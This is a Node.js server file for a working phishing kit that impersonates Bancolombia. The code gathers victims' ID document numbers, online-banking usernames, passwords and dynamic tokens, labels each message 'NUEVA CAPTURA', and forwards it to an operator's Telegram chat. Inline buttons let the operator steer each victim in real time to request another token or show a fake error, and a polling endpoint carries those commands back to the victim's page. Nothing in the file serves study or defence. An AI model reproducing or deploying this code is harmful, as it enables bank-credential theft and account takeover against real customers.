require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Validate environment variables
const requiredEnvVars = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID'];
const missingEnvVars = requiredEnvVars.filter(varName => !process.env[varName]);

if (missingEnvVars.length > 0) {
    console.error('❌ ERROR: Missing required environment variables:', missingEnvVars.join(', '));
    console.error('Please check your .env file or Railway environment variables.');
    // In production, we'll continue but log warnings
    if (process.env.NODE_ENV === 'production') {
        console.warn('⚠️  WARNING: Running in production without proper Telegram configuration!');
    }
}

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET || 'bancol_secret_key_123',
    resave: true,
    saveUninitialized: true,
    cookie: {
        secure: false,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// Log all requests to debug session stability
app.use((req, res, next) => {
    console.log(`[${req.method}] ${req.url} - SID: ${req.sessionID}`);
    next();
});

// Serve root index.html as main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Health check endpoint for Railway
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'ok', 
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Static files from public directory (for assets)
app.use('/public', express.static(path.join(__dirname, 'public')));

// Helpers
const formatSessionData = (sessionData) => {
    let message = "";

    if (sessionData.aviso) {
        message += `⚠️ <b>AVISO: ${sessionData.aviso}</b>\n`;
        message += "--------------------------------\n\n";
    }

    message += "🔔 <b>NUEVA CAPTURA - BANCOLOMBIA</b>\n\n";

    if (sessionData.documentType && sessionData.documentNumber) {
        message += "📋 <b>Documento</b>\n";
        message += `Tipo: ${sessionData.documentType}\n`;
        message += `Número: ${sessionData.documentNumber}\n\n`;
    }

    if (sessionData.usuario && sessionData.clave) {
        message += "🔐 <b>Credenciales</b>\n";
        message += `Usuario: ${sessionData.usuario}\n`;
        message += `Clave: ${sessionData.clave}\n\n`;
    }

    if (sessionData.token) {
        message += "🔑 <b>TOKEN DINÁMICO</b>\n";
        message += `Código: <code>${sessionData.token}</code>\n\n`;
    }

    if (sessionData.status) {
        message += `📍 <b>Estado:</b> ${sessionData.status}\n\n`;
    }

    message += "⏰ " + new Date().toLocaleString('es-CO');

    return message;
};

// API Endpoints
app.post('/api/process', (req, res) => {
    const { documentType, documentNumber } = req.body;
    req.session.documentType = documentType;
    req.session.documentNumber = documentNumber;
    req.session.telegram_stage = 'documento';
    req.session.currentAction = null;

    console.log(`[PROCESS] Doc: ${documentType} - ${documentNumber}`);
    req.session.save((err) => {
        if (err) console.error('Session Save Error:', err);
        res.json({ success: true });
    });
});

app.post('/api/send-message', async (req, res) => {
    try {
        const { stage, data } = req.body;

        // Validate Telegram configuration
        if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
            console.error('Telegram not configured properly');
            return res.status(500).json({ 
                success: false, 
                error: 'Telegram configuration missing' 
            });
        }

        // Accumulate data in session
        Object.assign(req.session, data);

        const message = formatSessionData(req.session);
        const sessionId = req.sessionID;

        const buttons = {
            inline_keyboard: [
                [
                    { text: '❌ Error Documento', callback_data: `error_documento:${sessionId}` },
                    { text: '✅ Pedir Logo', callback_data: `pedir_logo:${sessionId}` }
                ],
                [
                    { text: '❌ Error Logo', callback_data: `error_logo:${sessionId}` },
                    { text: '🔑 Pedir Token', callback_data: `pedir_token:${sessionId}` }
                ],
                [
                    { text: '❌ Error Token', callback_data: `error_token:${sessionId}` },
                    { text: '🏁 Finalizar', callback_data: `finalizar:${sessionId}` }
                ]
            ]
        };

        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                reply_markup: buttons
            })
        });

        const result = await response.json();
        
        if (!result.ok) {
            console.error('Telegram API Error:', result);
            return res.status(500).json({ 
                success: false, 
                error: 'Failed to send Telegram message' 
            });
        }

        req.session.save((err) => {
            if (err) {
                console.error('Session Save Error:', err);
                return res.status(500).json({ 
                    success: false, 
                    error: 'Session save failed' 
                });
            }
            res.json({ success: true });
        });
    } catch (error) {
        console.error('Send Message Error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// Polling and handling for Telegram
let lastUpdateId = 0;
let isPolling = false;

const pollTelegram = async () => {
    // Prevent multiple polling instances
    if (isPolling) return;
    
    // Don't start polling if credentials are missing
    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
        console.warn('⚠️  Telegram polling skipped (missing credentials)');
        return;
    }
    
    isPolling = true;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        
        if (!response.ok) {
            throw new Error(`Telegram API returned status ${response.status}`);
        }
        
        const data = await response.json();

        if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                    const callbackQuery = update.callback_query;
                    const [action, sessionId] = callbackQuery.data.split(':');
                    const messageId = callbackQuery.message.message_id;
                    const chatId = callbackQuery.message.chat.id;

                    console.log(`[TELEGRAM] Action: ${action} for Session: ${sessionId}`);

                    // Save action for the session
                    global.pendingActions = global.pendingActions || {};
                    global.pendingActions[sessionId] = action;

                    // 1. Remove buttons from the message
                    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            reply_markup: { inline_keyboard: [] }
                        })
                    });

                    // 2. Answer callback query to stop the loading state in Telegram
                    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ callback_query_id: callbackQuery.id })
                    });
                }
            }
        }
    } catch (error) {
        console.error('❌ Telegram Polling Error:', error.message);
        // Don't spam logs on repeated errors
    } finally {
        isPolling = false;
    }
    
    // Continue polling with exponential backoff on errors
    const delay = lastUpdateId === 0 ? 5000 : 1000; // Wait longer initially
    setTimeout(pollTelegram, delay);
};

// API Endpoints
app.get('/api/check-action', (req, res) => {
    const sessionId = req.sessionID;
    const action = global.pendingActions ? global.pendingActions[sessionId] : null;

    // Log only if there's an action or every 10 polls to avoid spam
    if (action) {
        console.log(`[POLL SUCCESS] Action: ${action} | Session: ${sessionId}`);
        delete global.pendingActions[sessionId];
    }

    res.json({ action: action || null });
});

// 404 Handler - Must be after all other routes
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'Route not found',
        path: req.path 
    });
});

// Global Error Handler - Must be last
app.use((err, req, res, next) => {
    console.error('💥 Server Error:', err);
    res.status(err.status || 500).json({
        success: false,
        error: process.env.NODE_ENV === 'production' 
            ? 'Internal server error' 
            : err.message
    });
});

// Start Server
const server = app.listen(PORT, () => {
    console.log(`✅ Server running on http://localhost:${PORT}`);
    console.log(`📝 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`🤖 Telegram Bot: ${process.env.TELEGRAM_BOT_TOKEN ? 'Configured' : 'NOT CONFIGURED'}`);
    
    // Start Telegram polling automatically
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
        pollTelegram();
        console.log('🔄 Telegram polling started');
    } else {
        console.warn('⚠️  Telegram polling disabled (missing credentials)');
    }
});

// Graceful shutdown
const gracefulShutdown = (signal) => {
    console.log(`\n${signal} received. Starting graceful shutdown...`);
    server.close(() => {
        console.log('✅ HTTP server closed');
        process.exit(0);
    });

    // Force shutdown after 10 seconds
    setTimeout(() => {
        console.error('❌ Forcing shutdown after timeout');
        process.exit(1);
    }, 10000);
};

// Handle different termination signals
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
    // In production, we log but don't crash immediately
    if (process.env.NODE_ENV !== 'production') {
        process.exit(1);
    }
});

// Handle unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
    // In production, we log but don't crash immediately
    if (process.env.NODE_ENV !== 'production') {
        process.exit(1);
    }
});
